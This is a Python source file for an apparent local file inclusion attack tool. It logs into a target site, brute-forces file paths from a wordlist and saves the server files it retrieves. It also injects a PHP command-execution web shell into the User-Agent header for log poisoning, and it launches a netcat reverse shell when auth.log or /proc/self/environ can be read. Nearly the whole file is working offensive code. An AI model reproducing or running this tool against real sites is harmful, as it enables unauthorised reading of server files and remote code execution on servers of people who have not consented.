#!/usr/bin/env python
import urllib.response
import time
import sys
import argparse
import mechanize
import ssl
import urllib
import re
import os
import subprocess


ssl._create_default_https_context = ssl._create_unverified_context  
path = ('file://'+os.getcwd()+'/FileStore/').replace('\\n','')    
class Local_File_In:

        def __init__(self,**kwargs) :          
            if self.args.readuser:
                 with open(self.args.readuser,'r') as username:
                      self.args.user = username.read().replace('/n','')
            if self.args.readpass:
                 with open(self.args.readpass,'r') as password:
                      self.args.password = password.read().replace('/n','')  
           # if self.args.read:
           #    from Package.one_read import Read_File
            #   run = Read_File()
             #  exit()
            try:   
                if self.args.Cookie:
                   with open(self.args.Cookie,'r') as Cookie_file :
                      self.Cookie =  Cookie_file.read()
            except Exception as e :
                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                   print("[*] Error : ",e )
                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                   print("[*] Chech the File Name or File Path  to your Cookies File")
                   exit()                             
            print('\n'+'='*20+"\n[*] Input-INFO "+'\n'+'='*30+'\n')
            if self.args.auth:
               print("[+] Mothead             : ................ | : Full authentication")    
               try:
                  print("[+] Login url           : ................ | : "+self.args.loginurl)
                  print("[+] username            : ................ | : "+self.args.user.replace("\n",''))
                  print("[+] Login password      : ................ | : "+self.args.password)
               except Exception as e:
                  print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                  print("[*] Error : ",e )
                  print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                  print("[*] Chech login info UserName and Password ")
                  print("[*] Should use --loginurl <url> --username <username> --password <password>")
                  print("[*] Should username and Password is True")
                  print("[*] Example : --url lodinurl http://10.10.10.44/login.php --user admin --password admim")
                  print("[*] ckeck Readme file at : https://www.github/jac11/LFI_Hunter.git")
                  exit()                    
                  
            if self.args.filelist:
                print("[+] LFI-wordlist        : ................ | : "+self.args.filelist)
            else:
                print("[+] LFI-wordlist        : ................ | : LFI-wordlist.txt")  
            if self.args.Domain:
               print("[+] Vulnrenable url     : ................ | : "+self.args.Domain)
            else:   
                print("[+] Vulnrenable url     : ................ | : "+self.args.Vulnurl)
            if self.args.base64:
               print("[+] PHP-Filter          : ................ | : Convert-base64") 
            print("[+] web Cookies         : ................ | : "+self.Cookie) 
            if self.args.Domain:
               self.args.Vulnurl = self.args.Domain
            else:
                pass   
            if self.args.auth and self.args.Vulnurl\
            and self.args.password and self.args.user\
            and self.args.Cookie and self.args.loginurl :
                 Local_File_In.Login_auth(self)
                 Local_File_In.file_name(self)
                 Local_File_In.url_request(self)
            elif not self.args.auth and self.args.Vulnurl\
            and not self.args.password and not self.args.user and self.args.Cookie :
                Local_File_In.url_request(self)                
            else:
                print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                print("[*] Error :  Bad argument Logic command  Error" )
                print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                print('[+] To use LFI with login     : --auth --loginurl --Vulnurl --user --password --filelist --Cookie ') 
                print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
                print("[*] ckeck Readme file at      : https://www.github/jac11/LFI_Hunter.git")
                exit()                   
        def Login_auth(self,**kwargs):
            try:
               loginurl = self.args.loginurl
               request = mechanize.Browser()
               request.set_handle_robots(False)
               request.set_handle_redirect(True)
               request.set_handle_refresh(True, max_time=1)
               request.addheaders = [('User-agent', 'Mozilla/5.0 (X11; U; Linux i686; en-US; rv:1.9.0.1) Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('Cookie',str(self.Cookie).replace('\n','')),]
               url_login = request.open(loginurl) 
               try: 
                  request.select_form(nr = 0)
               except Exception :
                  try:
                    request.select_form(nr = 1)
                  except Exception:
                     try:
                       request.select_form(nr = 2)
                     except Exception:      
                        try:
                           request.select_form(nr = 3)
                        except Exception:
                             try:
                                request.select_form(nr = 4)
                             except Exception as e:
                                  print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                                  print("[*] Error : ",e )
                                  print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                                  print("[*] try to use with out login Mothead") 
                                  print('[+] To use LFI without  login : --Vulnurl --filelist --Cookie') 
                                  exit()                                   
                                 
               if  self.args.user and self.args.password and not self.args.PassForm and  not self.args.UserForm  :
                   request["username"] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}' 
               elif self.args.user and  self.args.password and not self.args.PassForm and  self.args.UserForm:
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request["password"] = f'{self.args.password}'
               elif self.args.user and self.args.password and self.args.PassForm and not self.args.UserForm :
                   request["username"] = '{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
               elif self.args.user and self.args.password and  self.args.PassForm and  self.args.UserForm :
                   request[f'{self.args.UserForm}'] = f'{self.args.user}'
                   request[f'{self.args.PassForm}']=f'{self.args.password}' 
               response   = request.submit()         
               self.info = response.info()
               content    = response.read()  
               self.url = response.geturl()
            except urllib.error.URLError as e:
                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                   print("[*] Error : ",e )
                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                   print("[*] Follow url Format ")
                   print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                   print("[*] Example : http://10.10.10.193:4000/page=index.php")
                   exit() 
            except KeyboardInterrupt :
                   exit()
          
        def url_request(self,**kwargs): 
            if self.args.Domain:
               domain = str(re.search('https?://(www\.)?([a-zA-Z0-9]+)(\.[a-zA-Z0-9.-]+)', self.args.Domain)).split()
               self.ip_re = (domain[-1][7:-2])
               self.ip_re = self.ip_re[6:]
            else:

               self.ip_re = re.search('(([0-9]|[1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\.){3}([0-9]|\
                      [1-9][0-9]|1[0-9]{2}|2[0-4][0-9]|25[0-5])\\b\\b',self.args.Vulnurl) 
               try :
                   self.ip_re = self.ip_re.group()
               except Exception:
                    self.ip_re = "0.0.0.0.0"    
            try:           
               if not os.path.exists('./FileStore/'+self.ip_re+"/"):
                  os.makedirs('./FileStore/'+self.ip_re+"/")
            except AttributeError as e:
                  print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                  print("[*] Error : ",e )
                  print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                  print("[*] Follow url Format ")
                  print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                  print("[*] Example : http://10.10.10.193:4000/page=index.php")
                  exit()                    
            ssl._create_default_https_context = ssl._create_unverified_context 
            if not self.args.filelist:
                   self.args.filelist= './Package/LFI-wordlist.txt'
            else:
                 pass  
            try:                         
               with open(self.args.filelist,'r') as readline :
                    pass
            except FileNotFoundError as e:
                   print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                   print("[*] Error : ",e )
                   print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                   print("[*] chech the file path  to your own LFL Wordlist  -F /--filelist")
                   print("[*] try to use Default Path without -F/--filelist")  
                   exit()
            with open(self.args.filelist,'r') as readline :        
                command_dir = readline.readlines()
                for LINE in command_dir :
                    LINE.replace('\n','')
                    self.LFi = ''
                    if self.args.base64:
                        phpfillter = 'php://filter/read=convert.base64-encode/resource='
                        URL = self.args.Vulnurl.split("=")[0]+"="+ phpfillter+LINE
                    else:
                         URL = self.args.Vulnurl+LINE
                                                                                                          
                    self.url =  URL
                    request = mechanize.Browser()
                    request.set_handle_robots(False)
                    request.set_handle_redirect(True)
                    request.set_handle_refresh(True, max_time=1)              
                    request.addheaders = [('User-agent', 'Mozilla/5.0<?php echo system($_GET["cmd"]); ?> (X11; U; Linux i686; en-US; rv:1.9.0.1)\
                                 Gecko/2008071615 Fedora/3.0.1-1.fc9 Firefox/3.0.1'),
                                 ('username',f'{self.args.user}'),
                                 ('password',f'{self.args.password}'),
                                 ('Cookie',str(self.Cookie).replace('\n',''))]
                                
                    try:             
                        self._first_req = request.open(self.args.Vulnurl).read()                                                      
                        self.Get_Oregnal_URL = request.open(self.url).read()
                    except Exception  as e :
                         print('\n'+'='*20+"\n[*] ERROR-INFO "+'\n'+'='*30+'\n')
                         print("[*] Error : ",e )
                         print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                         print("[*] Follow url Format ")
                         print("[*] url Format : http/https://<ip>:<port>/<dir>")  
                         print("[*] Example : http://10.10.10.193:4000/page=index.php")
                         exit()   
                    except KeyboardInterrupt:
                       exit()        
                    print('='*20+"\n[*] Brute Force "+'\n'+'='*30+'\n')
                    print("[+] Testing payload     : ................ | : "+self.url[-50:].replace('\\n',''))

                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K') 
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')                             
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K') 
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')
                    sys.stdout.write('\x1b[1A')
                    sys.stdout.write('\x1b[2K')

                    if self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) :                  
                      pythex = str(re.findall('Content-Length:.+',str(self.info)))
                      pythex= pythex.replace("['",'').replace("']",'')
                      if pythex in str(self.info):
                        info = str(self.info).replace(pythex,'Content-Length:'+str(len(self.Get_Oregnal_URL)))
                        rex2 = re.findall(':.+',info)
                        print('='*20+"\n[*] Web-Info "+'\n'+'='*30+'\n')
                        print("[+] Date                : ................ | "+rex2[0])
                        print("[+] Server              : ................ | "+rex2[1])
                        print("[+] Expires             : ................ | "+rex2[2])
                        print("[+] Cache-Control       : ................ | "+rex2[3])
                        print("[+] Pragma              : ................ | "+rex2[4])
                        print("[+] Vary                : ................ | "+rex2[5])
                        print("[+] Content-Length      : ................ | "+str(rex2[6]).replace(':',': '))
                        print("[+] Connection          : ................ | "+rex2[7])
                        print("[+] Content-Type        : ................ | "+rex2[8]+'\n')
                        print('='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                        print("[+] Vulnerable  Link : ................ | : "+self.url)                        
                        Local_File_In.file_name(self)
                        from Package.FileStore import FileManager
                        FileManager.FileRStore_Write(self,args=self.control)
                        print('='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                        print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                        print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))
                        print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                        print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"+self.args.read.replace('/','',1).replace('/','_').replace('\n',''))
                        if self.args.shell:
                                if  "auth" in  self.url or "auth.log" in  self.url\
                                or "environ" in self.url: 
                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                    time.sleep(1)
                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
                                    print("[+] Mothead              : ................ | : enjaction log file  ")
                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                    print("[+] Lisliner IP          : ................ | :",self.ip_re)   
                                    print("[+] Lisliner Port        : ................ | : 7777") 
                                    Reverse_shell(self,**kwargs)
                                    exit()
                                else:
                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                      time.sleep(1)
                                      print("[*] FILE : ", self.args.read)
                                      time.sleep(1)
                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
                                      time.sleep(1)
                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
                                      print("[*] Example : --read /var/log/auth.log ")
                                      print("[*] Example : --read /proc/self/environ")
                                      print("[*] Example : --read /var/log/auth")
                                      exit()       
                        else:
                             exit()                 
                    elif not self.args.auth and len(self.Get_Oregnal_URL) > len(self._first_req) :
                        Local_File_In.file_name(self)
                        from Package.FileStore import FileManager
                        FileManager.FileRStore_Write(self,args=self.control)
                        print('='*20+"\n[*] Vulnerable Found  "+'\n'+'='*30+'\n')
                        print("[+] Vulnerable Link     : ................ | : "+self.url)
                        print('='*20+"\n[*] Directory Traversal "+'\n'+'='*30+'\n')
                        print("[+] File request        : ................ | : "+self.args.read.replace('\n','')) 
                        print("[+] Full  URL           : ................ | : "+ self.url.replace('\n',''))          
                        print("[+] File Name           : ................ | : "+self.args.read.replace('\\n',''))
                        print("[+] save Locatoin       : ................ | : "+path+self.ip_re+"/"\
                          +self.args.read.replace('/','',1).replace('/','_').replace('\n',''))   
                        if self.args.shell:
                                if  "auth" in  self.url or "auth.log" in  self.url\
                                or "environ" in self.url: 
                                    print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                    time.sleep(1)
                                    print("[+] Attack type          : ................ | : Reverse-Shell") 
                                    print("[+] Mothead              : ................ | : enjaction log file  ")
                                    print("[+] Lisliner Tool        : ................ | : NETCAT ")
                                    print("[+] Lisliner IP          : ................ | :",self.ip_re)   
                                    print("[+] Lisliner Port        : ................ | : 7777") 
                                    self.Reverse_shell()
                                    exit()
                                else:
                                      print('\n'+'='*20+"\n[*] Shell-Info "+'\n'+'='*30+'\n')
                                      time.sleep(1)
                                      print("[*] FILE : ", self.args.read)
                                      time.sleep(1)
                                      print("[*] INFO :  Cat not add PHP Code To",self.args.read)
                                      time.sleep(1)
                                      print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                                      print("[*] To Get Shell try  --read  with 'environ/auth' log file ")  
                                      print("[*] Example : --read /var/log/auth.log ")
                                      print("[*] Example : --read /proc/self/environ")
                                      print("[*] Example : --read /var/log/auth")
                                      exit()
                        else:
                              exit()                             
                print('\n'+'='*20+"\n[*] RESUITE-INFO "+'\n'+'='*30+'\n')
                print("[*] No Data found")
                print('\n'+'='*10+"\n[*] Solution "+'\n'+'='*14+'\n')
                print("[*] try to use Defrant LFI wordlist ")
                if not self.args.base64:
                   print("[*] try to use PHP Filter bu useing -B64/--base64 ")  
                exit()                   
        def Reverse_shell(self,**kwargs):
                   try:
                     from Package.LFT_Shell_connect import Shell_conncet
                     Shell_conncet.__init__(self)
                   except KeyboardInterrupt :
                      exit()
        def file_name (self,**kwargs):
          self.args.read = "-".join(str("".join(re.findall('=.+',self.url))).split("/")[-2:])
          with open (".RQData",'w')as RQ :
             RQ.write(str(self._first_req))
if __name__=='__main__':
     Local_File_In()